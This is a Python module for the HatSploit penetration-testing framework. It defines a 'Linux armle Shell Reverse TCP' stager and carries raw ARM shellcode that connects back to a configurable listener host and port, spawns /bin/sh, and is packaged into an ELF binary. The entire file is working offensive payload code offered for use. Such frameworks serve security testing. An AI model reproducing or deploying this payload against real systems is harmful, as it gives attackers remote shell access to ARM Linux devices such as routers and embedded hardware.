#!/usr/bin/env python3

#
# This payload requires HatSploit: https://hatsploit.netlify.app
# Current source: https://github.com/EntySec/HatSploit
#

from hatvenom import HatVenom
from hatsploit.lib.payload import Payload
from hatsploit.utils.tcp import TCPClient


class HatSploitPayload(Payload, HatVenom, TCPClient):
    details = {
        'Category': "stager",
        'Name': "Linux armle Shell Reverse TCP",
        'Payload': "linux/armle/shell_reverse_tcp",
        'Authors': [
            'Ivan Nikolsky (enty8080) - payload developer'
        ],
        'Description': "Shell reverse TCP payload for Linux armle.",
        'Comments': [
            ''
        ],
        'Architecture': "armle",
        'Platform': "linux",
        'Risk': "high",
        'Type': "reverse_tcp"
    }

    options = {
        'LHOST': {
            'Description': "Local host.",
            'Value': TCPClient.get_local_host(),
            'Type': "ip",
            'Required': True
        },
        'LPORT': {
            'Description': "Local port.",
            'Value': 8888,
            'Type': "port",
            'Required': True
        }
    }

    def run(self):
        local_host, local_port = self.parse_options(self.options)

        offsets = {
            'lhost': local_host,
            'lport': local_port
        }

        shellcode = (
            b"\x01\x10\x8F\xE2"
            b"\x11\xFF\x2F\xE1"
            b"\x02\x20\x01\x21"
            b"\x92\x1A\x0F\x02"
            b"\x19\x37\x01\xDF"
            b"\x06\x1C\x08\xA1"
            b"\x10\x22\x02\x37"
            b"\x01\xDF\x3F\x27"
            b"\x02\x21\x30\x1c"
            b"\x01\xdf\x01\x39"
            b"\xFB\xD5\x05\xA0"
            b"\x92\x1a\x05\xb4"
            b"\x69\x46\x0b\x27"
            b"\x01\xDF\xC0\x46"
            b"\x02\x00"
            b":lport:port:"
            b":lhost:ip:"
            b"\x2f\x62\x69\x6e"
            b"\x2f\x73\x68\x00"
        )

        payload = self.generate('elf', 'armle', shellcode, offsets)
        return payload
